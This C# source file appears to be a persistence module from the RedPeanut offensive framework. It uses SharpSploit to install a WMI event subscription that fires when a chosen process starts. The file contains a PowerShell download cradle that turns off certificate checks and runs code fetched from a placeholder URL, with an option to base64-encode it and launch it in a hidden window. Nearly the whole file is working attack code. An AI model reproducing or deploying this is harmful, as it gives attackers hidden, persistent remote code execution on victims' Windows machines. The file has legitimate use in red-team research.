//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Management;
using System.Text;

class PersWMI
{
    static bool encoded = bool.Parse("#ENCODED#");
    static string eventName = "#EVENTNAME#";
    static string eventConsumer = "CommandLine";
    //static string scriptingEngine = "#SCRIPTENGINE#";
    static string commandsrc = @"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex((New-Object system.net.WebClient).DownloadString('#URL#'))";
    static string commandenc = @"C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -w 1 -enc #PAYLOAD#";
    static string command = @"C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -w 1 -command ""#PAYLOAD#""";
    static string processName = "#PROCESSNAME#";

    public static void Execute(string[] args)
    {
        SharpSploit.Persistence.WMI.EventConsumer cons;
        if (eventConsumer.Equals("ActiveScript"))
            cons = SharpSploit.Persistence.WMI.EventConsumer.ActiveScript;
        else
            cons = SharpSploit.Persistence.WMI.EventConsumer.CommandLine;

        /*ScriptingEngine seng;
        if (scriptingEngine.Equals("JScript"))
            seng = ScriptingEngine.JScript;
        else
            seng = ScriptingEngine.VBScript;*/

        if (SharpSploit.Persistence.WMI.InstallWMIPersistence(eventName, SharpSploit.Persistence.WMI.EventFilter.ProcessStart, cons, GetEncodedScript(encoded), processName/*, seng*/))
            Console.WriteLine("[*] WMI installed");
        else
            Console.WriteLine("[*] WMI not installed");
    }

    private static string GetEncodedScript(bool encoded)
    {
        if (encoded)
            return commandenc.Replace("#PAYLOAD#",Convert.ToBase64String(Encoding.Unicode.GetBytes(commandsrc)));
        else
            return command.Replace("#PAYLOAD#",commandsrc);
    }
}
